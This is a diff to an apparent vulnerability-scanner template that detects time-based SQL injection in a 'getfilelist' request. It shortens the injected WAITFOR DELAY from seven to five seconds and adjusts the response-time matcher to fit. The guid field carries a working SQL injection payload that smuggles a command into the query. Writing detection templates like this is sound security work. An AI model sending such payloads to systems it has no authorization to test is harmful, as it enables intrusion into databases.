@@ -12,12 +12,12 @@ Host: {{Hostname}}
 User-Agent: {{random_ua}}
 Content-Type: application/x-www-form-urlencoded
 
-type=getfilelist&guid=';WAITFOR+DELAY+'0:0:7'--
+type=getfilelist&guid=';WAITFOR+DELAY+'0:0:5'--
 
 #@ timeout: 20
 #@ condition: and
 #@ matcher: status_code == 200
-#@ matcher: response_time > 7
+#@ matcher: response_time >= 5
 #@ matcher: header["Content-Type"] contains "plain" 
 #@ matcher: body contains "[]"
 
@@ -25,4 +25,4 @@ type=getfilelist&guid=';WAITFOR+DELAY+'0:0:7'--
 
 
 
-# @VEIL-STAMP: 913a43c4ce7f9076cbf0e4ade707be86a5d06c8889d2cf603f4cff2fd76d078b
+# @VEIL-STAMP: ea2bb6d67cc63dfadee27f56237f6245fc38888131c3c0751c6705c170fd8d46
